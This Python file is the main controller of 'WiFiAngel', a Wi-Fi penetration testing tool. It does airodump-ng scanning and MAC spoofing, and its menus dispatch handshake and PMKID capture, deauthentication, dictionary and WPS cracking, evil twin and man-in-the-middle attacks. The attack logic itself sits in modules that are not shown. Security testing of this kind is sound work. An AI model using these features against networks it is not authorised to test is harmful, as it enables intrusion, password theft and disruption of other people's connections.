"""Interactive Wi-Fi security analysis application (main controller)."""

from __future__ import annotations

import asyncio
import base64
import concurrent.futures
import csv
import gc
import glob
import io
import ipaddress
import json
import os
import random
import re
import select
import shutil
import shlex
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from itertools import islice
from pathlib import Path
from typing import Optional

import netifaces
import nmap
from bleak import BleakScanner
from rich import box
from rich.align import Align
from rich.console import Console, Group
from rich.layout import Layout
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.prompt import Prompt
from rich.style import Style
from rich.table import Row, Table
from rich.text import Text
from rich.tree import Tree
from scapy.all import *
from zeroconf import ServiceBrowser, Zeroconf

from adapters.system_tools import (
    CommandRunner,
    DOWNLOAD_TEST_BYTES,
    UPLOAD_TEST_BYTES,
    WiFiAdapterManager,
    arp_lookup_command,
    bettercap_command,
    bettercap_stdin_eval_command,
    build_speed_recommendations,
    bytes_to_mbytes_per_second,
    curl_download_command,
    curl_upload_command,
    download_speed_rating,
    estimate_upload_mbytes_per_second,
    fallback_upload_mbytes_per_second,
    managed_name_from_monitor,
    mbytes_to_mbits,
    parse_mac_from_arp_output,
    parse_ping_stats,
    ping_command,
    ping_probe_command,
    speed_gauge_blocks,
    upload_speed_rating,
)
from app.logger import Logger
from app.services.attacks.capture_verification import (
    stream_output_to_file as svc_stream_output_to_file,
    verify_handshake as svc_verify_handshake,
    verify_pmkid as svc_verify_pmkid,
)
from app.services.attacks.attack_flows import (
    run_capture_handshake as svc_run_capture_handshake,
    run_dictionary_attack as svc_run_dictionary_attack,
    run_hybrid_attack as svc_run_hybrid_attack,
    run_pmkid_attack as svc_run_pmkid_attack,
    run_wps_attack as svc_run_wps_attack,
)
from app.services.attacks.auto_hack_flow import run_auto_hack_single_network as svc_run_auto_hack_single_network
from app.services.system.cleanup_flow import run_auto_hack_cleanup as svc_run_auto_hack_cleanup, run_kill_processes as svc_run_kill_processes
from app.services.system.evil_twin_helpers import (
    conntrack_cli_bytes_for_ip as svc_conntrack_cli_bytes_for_ip,
    fetch_conntrack_tcp_lan as svc_fetch_conntrack_tcp_lan,
    fetch_established_tcp_for_lan as svc_fetch_established_tcp_for_lan,
    format_bytes as svc_format_bytes,
    nf_conntrack_bytes_for_ip as svc_nf_conntrack_bytes_for_ip,
    parse_dnsmasq_query_lines as svc_parse_dnsmasq_query_lines,
)
from app.ui import (
    BORDER_STYLE,
    TUI_THEME,
    create_scan_results_table,
    render_menu_panel,
    render_welcome_banner,
    target_banner,
)
from attacks.commands import (
    aircrack_check,
    aircrack_crack,
    aireplay_deauth,
    airodump_capture,
    airodump_network_discovery,
    hashcat_crack,
    hcxdumptool_capture,
    hcxpcapngtool_convert,
    hcxpcapngtool_info,
)
from attacks.parsers import (
    extract_hashcat_password_for_bssid,
    extract_wifi_password,
    has_aircrack_handshake,
    is_valid_wifi_password,
    parse_aircrack_network_info,
)
from cleanup import resolve_evil_twin_log_dir
from config import (
    AUTO_HACK_SESSIONS_DIR,
    DEFAULT_WORDLIST,
    HANDSHAKE_DIR,
    ROCKYOU_WORDLIST,
    TMP_DIR,
    WIFI_ANGEL_SESSION_BINARIES,
)
from wifi.airodump_csv import ap_row_to_network_fields, parse_airodump_csv, station_client_counts
from wifi.packets import (
    get_security_info as packet_get_security_info,
    parse_client_observation,
    parse_network_observation,
)


class WiFiAngel:
    def __init__(self):
        if os.geteuid() != 0:
            print("[bold red]Root privileges are required to run WiFiAngel.[/]")
            sys.exit(1)

        self.console = Console(theme=TUI_THEME, highlight=True)
        self.networks = {}
        self.clients = {}
        self.interface_name = None
        self.selected_network = None
        self.scanning = False
        self.current_menu = "main"
        self._suppress_live_updates = False
        self._current_scan_channel = 0
        self.layout = Layout()
        self.live = Live("", console=self.console, auto_refresh=False)
        self.logger = Logger()
        self.command_runner = CommandRunner(logger=self.logger)
        self.wifi_adapter = WiFiAdapterManager(self.command_runner)
        
        render_welcome_banner(
            self.console,
            author_line="Cuma KURT  cumakurt@gmail.com",
            url_line="https://www.linkedin.com/in/cuma-kurt-34414917/",
        )
        
        try:
            required_tools = list(WIFI_ANGEL_SESSION_BINARIES)
            missing_tools = self.wifi_adapter.missing_tools(required_tools)
            
            if missing_tools:
                self.console.print(f"[bold red]Missing required tools: {', '.join(missing_tools)}[/]")
                self.console.print("[yellow]Please install the missing tools using:[/]")
                self.console.print("[white]sudo apt install aircrack-ng hashcat hcxdumptool[/]")
                sys.exit(1)

            wifi_interfaces = self.wifi_adapter.list_wireless_interfaces()
            
            if not wifi_interfaces:
                self.console.print(
                    "[bold red]No Wi-Fi interfaces were detected.[/]\n"
                    "[yellow]Checks:[/]\n"
                    " • Is this a VM? Pass the USB Wi-Fi dongle or PCI device through to the guest.\n"
                    " • Run [white]ip link[/] and [white]iw dev[/] — you should see a [white]wlan*[/] device.\n"
                    " • Optional: [white]sudo apt install wireless-tools[/] if [white]iwconfig[/] is missing.\n"
                    " • Some containers/WSL environments do not expose wireless hardware."
                )
                raise RuntimeError(
                    "No wireless network adapter found (see messages above)."
                )
            
            if len(wifi_interfaces) > 1:
                self.console.print()
                rows = "\n".join(
                    f"  [menu.key]{i:>2}[/]  [cyan]{iface}[/]"
                    for i, iface in enumerate(wifi_interfaces, 1)
                )
                self.console.print(
                    Panel(
                        rows,
                        title="[title]Select wireless interface[/]",
                        border_style=BORDER_STYLE,
                        box=box.MINIMAL,
                        padding=(1, 2),
                    )
                )
                choice = Prompt.ask("[heading]Interface #[/]", choices=[str(i) for i in range(1, len(wifi_interfaces) + 1)])
                self.interface_name = wifi_interfaces[int(choice)-1]
            else:
                self.interface_name = wifi_interfaces[0]
                
            self.console.print(f"[success]OK[/] [meta]Adapter ready[/]  [cyan]{self.interface_name}[/]")
            self.logger.info(f"WiFi adapter initialized: {self.interface_name}")
            
        except Exception as e:
            self.logger.error(f"Could not initialize WiFi adapter: {str(e)}")
            self.console.print(f"[bold red]Could not initialize WiFi adapter: {str(e)}[/]")
            sys.exit(1)

    def create_header(self):
        return Panel(
            "[brand]WiFiAngel[/]  [meta]|[/]  [menu.dim]Wireless Network Analysis Tool[/]",
            border_style=BORDER_STYLE,
            box=box.MINIMAL,
            padding=(0, 1),
        )
        
    def start_monitor_mode(self):
        try:
            self.console.print("[info]Starting monitor mode...[/]")
            self.logger.info("Starting monitor mode")

            original_interface = self.interface_name
            self.interface_name = self.wifi_adapter.start_monitor_mode(self.interface_name)
            self.logger.info(f"{original_interface} switched to monitor mode")
            
            self.console.print(f"[success]Monitor mode active[/]  [cyan]{self.interface_name}[/]")
            self.logger.info(f"Monitor mode active: {self.interface_name}")
            return True
        except Exception as e:
            self.logger.error(f"Could not start monitor mode: {str(e)}")
            self.console.print(f"[bold red]Error: {str(e)}[/]")
            return False

    def _airodump_scan_loop(self):
        """Passive discovery via airodump-ng CSV (--band abg); merge rows into self.networks."""
        tmp = Path(TMP_DIR)
        tmp.mkdir(parents=True, exist_ok=True)
        prefix = tmp / f"wa_scan_{os.getpid()}_{threading.get_ident()}_{int(time.time() * 1000)}"
        csv_path = Path(f"{prefix}-01.csv")
        argv = airodump_network_discovery(self.interface_name, prefix, write_interval=1)
        proc: Optional[subprocess.Popen] = None
        try:
            proc = subprocess.Popen(
                argv,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            while self.scanning:
                time.sleep(1.05)
                if proc.poll() is not None:
                    self.logger.error(f"airodump-ng exited unexpectedly (code {proc.returncode})")
                    break
                if not csv_path.is_file():
                    continue
                try:
                    aps, stas = parse_airodump_csv(csv_path)
                    by_bssid = station_client_counts(stas)
                    now = datetime.now()
                    with self._networks_lock:
                        for ap in aps:
                            fields = ap_row_to_network_fields(ap)
                            if not fields:
                                continue
                            bssid = fields["bssid"]
                            ch = int(fields["channel"] or 0)
                            ssid_val = fields["ssid"]
                            sig = int(fields["signal"])
                            cipher_str = str(fields["cipher"])
                            beacons = int(fields["beacons"])
                            wps = bool(fields["wps"])
                            st_clients = by_bssid.get(bssid, set())
                            if bssid not in self.networks:
                                self.networks[bssid] = {
                                    "ssid": ssid_val,
                                    "signal": sig,
                                    "cipher": cipher_str,
                                    "clients": set(st_clients),
                                    "channel": ch if ch > 0 else 0,
                                    "first_seen": now,
                                    "last_seen": now,
                                    "packets": beacons,
                                    "data_packets": 0,
                                    "wps": wps,
                                }
                            else:
                                prev = self.networks[bssid]
                                merged_clients = set(prev["clients"])
                                merged_clients.update(st_clients)
                                upd = {
                                    "last_seen": now,
                                    "signal": sig,
                                    "packets": max(prev["packets"], beacons),
                                    "cipher": cipher_str,
                                    "wps": wps or prev.get("wps", False),
                                    "clients": merged_clients,
                                }
                                if ch > 0:
                                    upd["channel"] = ch
                                if (
                                    ssid_val
                                    and ssid_val != "<Hidden Network>"
                                    and prev.get("ssid") == "<Hidden Network>"
                                ):
                                    upd["ssid"] = ssid_val
                                self.networks[bssid].update(upd)
                except Exception as e:
                    if self.scanning:
                        self.logger.error(f"airodump CSV merge error: {e}")
        finally:
            if proc is not None:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            try:
                for p in prefix.parent.glob(prefix.name + "*"):
                    p.unlink(missing_ok=True)
            except OSError:
                pass

    def _results_updater(self):
        while self.scanning:
            try:
                self.print_results()
                time.sleep(0.3)
            except Exception as e:
                self.logger.error(f"Results update error: {str(e)}")
                time.sleep(0.1)

    def scan_networks(self, *, live_table: bool = True):
        self.logger.info("Starting network scan (live_table=%s)", live_table)
        self._suppress_live_updates = not live_table
        if live_table:
            try:
                self.live.start()
            except Exception:
                pass

        if not hasattr(self, '_networks_lock'):
            self._networks_lock = threading.Lock()

        max_workers = 2 if live_table else 1
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self._airodump_scan_loop)]
            if live_table:
                futures.append(executor.submit(self._results_updater))
            try:
                while self.scanning:
                    time.sleep(0.1)
                    for future in futures:
                        if future.done() and future.exception():
                            self.logger.error(f"Scan thread error: {future.exception()}")
                            self.scanning = False
                            break
            except KeyboardInterrupt:
                self.scanning = False
                self.console.print("\n[bold yellow]Stopping network scan...[/]")
            finally:
                if live_table:
                    try:
                        self.live.stop()
                    except Exception:
                        pass
                self._suppress_live_updates = False
                for future in futures:
                    try:
                        future.result(timeout=2.0)
                    except Exception:
                        pass
                self.logger.info("Network scan stopped")
                gc.collect()

    def packet_handler(self, pkt):
        try:
            network_observation = parse_network_observation(pkt)
            if network_observation:
                with self._networks_lock:
                    bssid = network_observation.bssid
                    ch = network_observation.channel
                    if ch <= 0:
                        ch = int(getattr(self, "_current_scan_channel", 0) or 0)
                    ssid_val = network_observation.ssid
                    if bssid not in self.networks:
                        self.networks[bssid] = {
                            'ssid': ssid_val,
                            'signal': network_observation.signal,
                            'cipher': "/".join(network_observation.security),
                            'clients': set(),
                            'channel': ch,
                            'first_seen': datetime.now(),
                            'last_seen': datetime.now(),
                            'packets': 1,
                            'data_packets': 0,
                            'wps': network_observation.wps
                        }
                        self.logger.debug(f"New network found: {network_observation.ssid} ({bssid})")
                    else:
                        prev = self.networks[bssid]
                        upd = {
                            'last_seen': datetime.now(),
                            'signal': network_observation.signal,
                            'packets': prev['packets'] + 1
                        }
                        if ch > 0:
                            upd['channel'] = ch
                        if (
                            ssid_val
                            and ssid_val != "<Hidden Network>"
                            and prev.get('ssid') == "<Hidden Network>"
                        ):
                            upd['ssid'] = ssid_val
                        self.networks[bssid].update(upd)
            
            else:
                client_observation = parse_client_observation(pkt)
                if not client_observation:
                    return

                with self._networks_lock:
                    bssid = client_observation.bssid
                    if bssid in self.networks:
                        self.networks[bssid]['data_packets'] += 1
                        
                        src = client_observation.src
                        dst = client_observation.dst
                        
                        if src and src != bssid and src not in self.networks[bssid]['clients']:
                            self.networks[bssid]['clients'].add(src)
                            self.logger.debug(f"New client found: {src} -> {self.networks[bssid]['ssid']}")
                        
                        if dst and dst != bssid and dst not in self.networks[bssid]['clients']:
                            self.networks[bssid]['clients'].add(dst)
                            self.logger.debug(f"New client found: {dst} -> {self.networks[bssid]['ssid']}")

        except Exception as e:
            self.logger.error(f"Packet processing error: {str(e)}")

    def get_security(self, pkt):
        """Determines security type"""
        return "/".join(packet_get_security_info(pkt))

    def print_results(self):
        """Shows results in table format"""
        if getattr(self, "_suppress_live_updates", False):
            return
        table = create_scan_results_table()

        for idx, (bssid, data) in enumerate(self.networks.items(), 1):
            table.add_row(
                str(idx),
                bssid,
                data["ssid"],
                str(data["channel"]),
                data["cipher"],
                str(data["signal"]),
                str(len(data["clients"])),
            )

        try:
            self.live.update(table)
            self.live.refresh()
        except Exception:
            pass

    def _scan_screen_until_enter(self) -> None:
        """Wait for Enter then return to main menu while capture threads keep running."""
        try:
            self.console.input("\n[meta]Press Enter to return to the main menu.[/] ")
        except EOFError:
            pass
        self._suppress_live_updates = True
        try:
            self.live.stop()
        except Exception:
            pass
        self.console.clear()

    def show_main_menu(self):
        """Shows the main menu"""
        self.current_menu = "main"
        while True:
            try:
                intro = [f"[meta]Adapter[/]  [cyan]{self.interface_name}[/]"]
                if self.scanning:
                    if getattr(self, "_suppress_live_updates", False):
                        intro.append(
                            "[success]SCAN[/] [meta]Capture active — live table off; option 2 stops scan[/]"
                        )
                    else:
                        intro.append(
                            "[success]LIVE[/] [meta]Network scan running (table updates below)[/]"
                        )

                render_menu_panel(
                    self.console,
                    heading="Main menu",
                    intro_lines=intro,
                    items=[
                        ("1", "Start monitor mode"),
                        ("2", "Start or stop network scan"),
                        ("3", "Select target network"),
                        ("4", "Attack techniques"),
                        ("5", "Tools"),
                        ("6", "Auto hack workflow"),
                        ("0", "Exit"),
                    ],
                )

                choice = Prompt.ask("[heading]Option[/]")
                self.logger.info(f"Main menu selection: {choice}")
                
                if choice == "1":
                    if not self.start_monitor_mode():
                        continue
                elif choice == "2":
                    # Check if monitor mode is active
                    if not self.interface_name.endswith("mon"):
                        self.console.print("[warning]Monitor mode is required for scanning.[/]")
                        self.console.print("[info]Enabling monitor mode automatically...[/]")
                        if not self.start_monitor_mode():
                            self.console.print("[error]Could not enable monitor mode.[/]")
                            continue

                    self.scanning = not self.scanning
                    if self.scanning:
                        self.console.clear()
                        self.console.print(
                            Panel(
                                "[heading]Network scan[/]\n\n"
                                "[meta]Live table below. From the main menu, use option 2 again to stop.[/]\n"
                                f"[meta]Adapter[/]  [cyan]{self.interface_name}[/]",
                                border_style=BORDER_STYLE,
                                box=box.MINIMAL,
                            )
                        )
                        self.console.print()
                        scan_thread = threading.Thread(target=self.scan_networks)
                        scan_thread.daemon = True
                        scan_thread.start()
                        time.sleep(0.2)
                        self._scan_screen_until_enter()
                    else:
                        self.console.print("[warning]Stopping scan...[/]")
                elif choice == "3":
                    self.select_target_network()
                elif choice == "4":
                    self.current_menu = "attack"
                    self.show_attack_menu()
                elif choice == "5":
                    self.current_menu = "tools"
                    self.show_tools_menu()
                elif choice == "6":
                    self.auto_hack()
                elif choice == "0":
                    if self.scanning:
                        self.console.print("[bold yellow]Stopping network scan...[/]")
                        self.scanning = False
                        time.sleep(1)
                    self.logger.info("Program shutting down...")
                    self.cleanup_and_exit()

            except KeyboardInterrupt:
                if self.scanning:
                    self.scanning = False
                    self.console.print("\n[bold yellow]Stopping network scan...[/]")
                    time.sleep(1)
                    continue
                else:
                    if self.current_menu == "main":
                        self.logger.info("Program shutting down...")
                        self.cleanup_and_exit()
                    else:
                        self.logger.info("Returning to main menu")
                        self.console.print("\n[bold yellow]Returning to main menu...[/]")
                        self.current_menu = "main"
                        continue

    def show_attack_menu(self):
        """Shows attack techniques menu"""
        while True:
            if self.selected_network:
                network = self.networks[self.selected_network]
                target_banner(self.console, str(network["ssid"]), self.selected_network)

            render_menu_panel(
                self.console,
                heading="Attack techniques",
                intro_lines=["[meta]Authorized use only.[/]"],
                items=[
                    ("1", "WPA / WPA2 / WPA3 handshake capture"),
                    ("2", "Deauthentication attack"),
                    ("3", "PMKID capture"),
                    ("4", "Dictionary attack"),
                    ("5", "Hybrid (handshake + PMKID)"),
                    ("6", "WPS attack"),
                    ("7", "Evil twin lab"),
                    ("8", "Man-in-the-middle toolkit"),
                    ("0", "Back to main menu"),
                ],
            )

            choice = Prompt.ask("[heading]Option[/]")
            
            if choice == "1":
                self.capture_handshake()
            elif choice == "2":
                self.show_deauth_menu()
            elif choice == "3":
                self.pmkid_attack()
            elif choice == "4":
                self.dictionary_attack()
            elif choice == "5":
                self.hybrid_attack()
            elif choice == "6":
                self.wps_attack()
            elif choice == "7":
                self.evil_twin_attack()
            elif choice == "8":
                self.mitm_attack()
            elif choice == "0":
                self.current_menu = "main"
                return

    def show_tools_menu(self):
        """Shows tools menu"""
        while True:
            render_menu_panel(
                self.console,
                heading="Tools",
                items=[
                    ("1", "Wi-Fi adapter settings"),
                    ("2", "Network statistics"),
                    ("3", "Client analysis"),
                    ("4", "MAC address changer"),
                    ("5", "Signal analyzer"),
                    ("6", "Channel optimizer"),
                    ("7", "Security audit"),
                    ("8", "Hidden SSID discovery"),
                    ("9", "Bluetooth and IoT scan"),
                    ("10", "Network speed test"),
                    ("0", "Back to main menu"),
                ],
            )

            choice = Prompt.ask("[heading]Option[/]")
            
            if choice == "1":
                self.wifi_adapter_settings()
            elif choice == "2":
                self.show_network_stats()
            elif choice == "3":
                self.client_analysis()
            elif choice == "4":
                self.mac_changer()
            elif choice == "5":
                self.signal_analyzer()
            elif choice == "6":
                self.channel_optimizer()
            elif choice == "7":
                self.security_audit()
            elif choice == "8":
                self.hidden_ssid_discovery()
            elif choice == "9":
                self.bluetooth_iot_scanner()
            elif choice == "10":
                self.speed_test()
            elif choice == "0":
                break

    def show_deauth_menu(self):
        """Shows deauthentication attack menu"""
        while True:
            render_menu_panel(
                self.console,
                heading="Deauthentication",
                intro_lines=["[meta]Disconnect clients from the selected AP (authorized only).[/]"],
                items=[
                    ("1", "Broadcast: all associated clients"),
                    ("2", "Single client MAC"),
                    ("0", "Back"),
                ],
            )

            choice = Prompt.ask("[heading]Option[/]")
            
            if choice == "1":
                self.deauth_all_clients()
            elif choice == "2":
                self.deauth_single_client()
            elif choice == "0":
                break

    def wifi_adapter_settings(self):
        """WiFi adapter settings menu"""
        while True:
            render_menu_panel(
                self.console,
                heading="Wi-Fi adapter",
                intro_lines=[f"[meta]Current interface[/]  [cyan]{self.interface_name}[/]"],
                items=[
                    ("1", "Switch monitor / managed mode"),
                    ("2", "Set channel"),
                    ("3", "Adapter information"),
                    ("0", "Back"),
                ],
            )

            choice = Prompt.ask("[heading]Option[/]")
            
            if choice == "1":
                self.change_adapter_mode()
            elif choice == "2":
                self.change_channel()
            elif choice == "3":
                self.show_adapter_info()
            elif choice == "0":
                break

    def change_adapter_mode(self):
        """Changes adapter mode menu"""
        render_menu_panel(
            self.console,
            heading="Adapter mode",
            items=[
                ("1", "Monitor mode"),
                ("2", "Managed mode"),
                ("0", "Back"),
            ],
        )

        choice = Prompt.ask("[heading]Option[/]")

        try:
            if choice == "1":
                self.interface_name = self.wifi_adapter.start_monitor_mode(self.interface_name)
                self.console.print(f"[success]Monitor mode[/]  [cyan]{self.interface_name}[/]")
                self.logger.info(f"Monitor mode activated on {self.interface_name}")
            elif choice == "2":
                self.console.print("[info]Switching to managed mode...[/]")
                self.interface_name = self.wifi_adapter.set_managed_mode(self.interface_name)
                time.sleep(2)

                # Verify the mode change
                try:
                    iw_info = subprocess.check_output(["iwconfig", self.interface_name], stderr=subprocess.STDOUT).decode()
                    if "Mode:Managed" in iw_info:
                        self.console.print(f"[success]Managed mode[/]  [cyan]{self.interface_name}[/]")
                        self.logger.info(f"Switched to managed mode: {self.interface_name}")
                    else:
                        self.console.print("[warning]Interface might not be in managed mode.[/]")
                except Exception as e:
                    self.console.print(f"[error]Verification failed:[/] {e!s}")
        except Exception as e:
            self.console.print(f"[error]{e!s}[/]")

    def change_channel(self):
        """Changes channel"""
        channel = Prompt.ask("Enter new channel number (1-14 or 36-165)")
        try:
            interface_name = self.interface_name
            channel = int(channel)
            self.command_runner.set_wireless_channel(interface_name, channel)
            self.console.print(f"[bold green]Channel changed to {channel}![/]")
        except ValueError:
            self.console.print("[bold red]Invalid channel number![/]")

    def show_adapter_info(self):
        """Shows adapter information"""
        try:
            interface_name = self.interface_name
            info = subprocess.check_output(["iwconfig", interface_name]).decode()
            self.console.print(Panel(info, title="Adapter Information", border_style=BORDER_STYLE, box=box.MINIMAL))
        except Exception as e:
            self.console.print(f"[bold red]Error: {str(e)}[/]")

    def mac_changer(self):
        """Change or restore the active adapter MAC address."""
        if self.command_runner.which("macchanger") is None:
            self.console.print("[bold red]macchanger is not installed![/]")
            self.console.print("[yellow]Install it with: sudo apt install macchanger[/]")
            return

        def apply_macchanger(args):
            self.console.print(f"[bold blue]Updating MAC address for {self.interface_name}...[/]")
            self.wifi_adapter.set_link_down(self.interface_name)
            result = self.command_runner.run(
                ["macchanger", *args, self.interface_name],
                capture_output=True,
            )
            self.wifi_adapter.set_link_up(self.interface_name)

            output = result.stdout.strip() or result.stderr.strip()
            if result.ok:
                self.console.print(Panel(output, title="MAC Changer", border_style=BORDER_STYLE, box=box.MINIMAL))
                self.logger.info(f"MAC address updated on {self.interface_name}")
            else:
                self.console.print(Panel(output or "macchanger failed", title="MAC Changer Error", border_style=BORDER_STYLE, box=box.MINIMAL))
                self.logger.error(f"MAC address change failed on {self.interface_name}: {output}")

        while True:
            self.console.print("\n[bold yellow]MAC Address Changer[/]")
            self.console.print(f"Current Adapter: {self.interface_name}")
            self.console.print("1. Show Current MAC")
            self.console.print("2. Set Random MAC")
            self.console.print("3. Set Custom MAC")
            self.console.print("4. Restore Permanent MAC")
            self.console.print("0. Back")

            choice = Prompt.ask("Select an option", choices=["0", "1", "2", "3", "4"])

            if choice == "0":
                return
            if choice == "1":
                result = self.command_runner.run(
                    ["macchanger", "-s", self.interface_name],
                    capture_output=True,
                )
                self.console.print(Panel(result.stdout.strip() or result.stderr.strip(), title="Current MAC", border_style=BORDER_STYLE, box=box.MINIMAL))
            elif choice == "2":
                apply_macchanger(["-r"])
            elif choice == "3":
                custom_mac = Prompt.ask("Enter custom MAC address")
                if not re.match(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$", custom_mac):
                    self.console.print("[bold red]Invalid MAC address format![/]")
                    continue
                apply_macchanger(["-m", custom_mac])
            elif choice == "4":
                apply_macchanger(["-p"])

    def pmkid_attack(self):
        """PMKID attack"""
        svc_run_pmkid_attack(self)

    def _read_wordlist_in_chunks(self, wordlist_path, chunk_size=1000):
        """Read wordlist file in chunks to optimize memory usage"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                while True:
                    chunk = list(islice(f, chunk_size))
                    if not chunk:
                        break
                    yield chunk
        except Exception as e:
            self.logger.error(f"Error reading wordlist: {str(e)}")
            yield []

    def dictionary_attack(self):
        """Optimized dictionary attack with wordlist"""
        svc_run_dictionary_attack(self)

    def hybrid_attack(self):
        """Performs hybrid attack using both handshake and PMKID methods"""
        svc_run_hybrid_attack(self)

    def signal_analyzer(self):
        """Analyzes WiFi signal strength and quality"""
        if not self.selected_network:
            self.console.print("[bold red]Please select a target network first![/]")
            return

        network = self.networks[self.selected_network]
        start_time = time.time()
        signal_data = []

        def create_signal_table():
            table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
            table.add_column("Time", style="cyan")
            table.add_column("Signal Strength (dBm)", style="green")
            table.add_column("Quality", style="yellow")
            table.add_column("Interference", style="red")

            for data in signal_data[-10:]:  # Show last 10 measurements
                quality = "Excellent" if data[1] > -50 else "Good" if data[1] > -60 else "Fair" if data[1] > -70 else "Poor"
                table.add_row(
                    data[0],
                    str(data[1]),
                    quality,
                    data[2]
                )
            return table

        try:
            with Live(create_signal_table(), refresh_per_second=2) as live:
                while True:
                    current_time = datetime.now().strftime("%H:%M:%S")
                    signal_strength = network['signal']
                    
                    # Check for interference
                    interference = "Low"
                    for other_bssid, other_net in self.networks.items():
                        if other_bssid != self.selected_network and abs(other_net['channel'] - network['channel']) <= 1:
                            interference = "High"
                            break
                    
                    signal_data.append((current_time, signal_strength, interference))
                    live.update(create_signal_table())
                    time.sleep(0.5)

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Signal analysis stopped.[/]")

    def channel_optimizer(self):
        """Analyzes and suggests the best channel for WiFi operation"""
        channel_usage = {i: 0 for i in range(1, 15)}  # 2.4GHz channels
        channel_usage.update({i: 0 for i in [36, 40, 44, 48, 52, 56, 60, 64]})  # 5GHz channels

        for network in self.networks.values():
            channel = network['channel']
            if channel in channel_usage:
                # Add weight based on signal strength
                weight = abs(network['signal']) / 100.0
                channel_usage[channel] += weight
                
                # Account for channel overlap (2.4GHz)
                if channel <= 14:
                    for i in range(max(1, channel-2), min(14, channel+2)):
                        if i != channel:
                            channel_usage[i] += weight * 0.5

        # Create channel analysis table
        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        table.add_column("Channel", style="cyan")
        table.add_column("Band", style="green")
        table.add_column("Usage", style="yellow")
        table.add_column("Recommendation", style="blue")

        for channel in sorted(channel_usage.keys()):
            band = "2.4GHz" if channel <= 14 else "5GHz"
            usage = "High" if channel_usage[channel] > 2 else "Medium" if channel_usage[channel] > 1 else "Low"
            recommendation = "Avoid" if usage == "High" else "Good" if usage == "Low" else "Fair"
            
            table.add_row(
                str(channel),
                band,
                usage,
                recommendation
            )

        self.console.print(table)

    def security_audit(self):
        """Performs a security audit of nearby networks"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        table.add_column("Network", style="cyan")
        table.add_column("Security Issues", style="red")
        table.add_column("Risk Level", style="yellow")
        table.add_column("Recommendations", style="green")

        for bssid, network in self.networks.items():
            issues = []
            risk_level = "Low"
            recommendations = []

            # Check encryption
            if "OPEN" in network['cipher']:
                issues.append("No encryption")
                risk_level = "High"
                recommendations.append("Enable WPA2/WPA3 encryption")
            elif "WEP" in network['cipher']:
                issues.append("WEP encryption (broken)")
                risk_level = "High"
                recommendations.append("Upgrade to WPA2/WPA3")
            elif "WPA" in network['cipher'] and not "WPA2" in network['cipher']:
                issues.append("WPA1 encryption (outdated)")
                risk_level = "Medium"
                recommendations.append("Upgrade to WPA2/WPA3")

            # Check WPS
            if network['wps']:
                issues.append("WPS enabled")
                risk_level = "Medium"
                recommendations.append("Disable WPS")

            # Check signal strength
            if network['signal'] > -30:
                issues.append("Signal too strong")
                recommendations.append("Reduce transmit power")
            elif network['signal'] < -70:
                issues.append("Signal too weak")
                recommendations.append("Increase transmit power or add repeaters")

            table.add_row(
                network['ssid'],
                "\n".join(issues) if issues else "None",
                risk_level,
                "\n".join(recommendations) if recommendations else "None"
            )

        self.console.print(table)

    def network_hopper(self):
        """Automatically hops between networks to gather intelligence"""
        if not self.networks:
            self.console.print("[bold red]No networks found. Please scan first![/]")
            return

        hopping = True
        current_index = 0
        networks_list = list(self.networks.items())
        
        def create_hopper_table():
            table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
            table.add_column("Current Network", style="cyan", width=30)
            table.add_column("Channel", style="green", justify="center")
            table.add_column("Clients", style="yellow", justify="center")
            table.add_column("Data Packets", style="blue", justify="center")
            table.add_column("Signal", style="magenta", justify="center")
            
            bssid, network = networks_list[current_index]
            table.add_row(
                network['ssid'],
                str(network['channel']),
                str(len(network['clients'])),
                str(network['data_packets']),
                str(network['signal'])
            )
            
            return Panel(table, title="[bold blue]Network Hopper[/]", border_style=BORDER_STYLE, box=box.MINIMAL)

        try:
            with Live(create_hopper_table(), refresh_per_second=2) as live:
                while hopping:
                    bssid, network = networks_list[current_index]
                    
                    # Switch to network's channel
                    self.command_runner.set_wireless_channel(self.interface_name, network['channel'])
                    
                    # Update display
                    live.update(create_hopper_table())
                    
                    # Wait on this channel
                    time.sleep(2)
                    
                    # Move to next network
                    current_index = (current_index + 1) % len(networks_list)

        except KeyboardInterrupt:
            self.console.print("\n[bold yellow]Network hopping stopped.[/]")

    def select_target_network(self):
        """Allows user to select a target network"""
        if not self.networks:
            self.console.print("[error]No networks found. Scan first.[/]")
            return

        # Create network selection table
        table = Table(show_header=True, header_style="bold magenta", box=box.MINIMAL, border_style=BORDER_STYLE)
        table.add_column("No", style="cyan", justify="center")
        table.add_column("BSSID", style="green")
        table.add_column("SSID", style="yellow")
        table.add_column("Channel", style="blue", justify="center")
        table.add_column("Signal", style="magenta", justify="center")
        table.add_column("Security", style="red")
        table.add_column("Clients", style="cyan", justify="center")

        # Add networks to table
        for idx, (bssid, network) in enumerate(self.networks.items(), 1):
            table.add_row(
                str(idx),
                bssid,
                network['ssid'],
                str(network['channel']),
                str(network['signal']),
                network['cipher'],
                str(len(network['clients']))
            )

        self.console.print(table)
        self.console.print("\n[bold yellow]Select target network (0 to cancel):[/]")

        try:
            choice = int(Prompt.ask("Enter network number"))
            if choice == 0:
                return
            
            if 1 <= choice <= len(self.networks):
                self.selected_network = list(self.networks.keys())[choice - 1]
                network = self.networks[self.selected_network]
                self.console.print(f"\n[success]Selected network: {network['ssid']} ({self.selected_network})[/]")
                self.logger.info(f"Selected target network: {network['ssid']} ({self.selected_network})")
            else:
                self.console.print("[error]Invalid network number.[/]")
        except ValueError:
            self.console.print("[error]Invalid input.[/]")

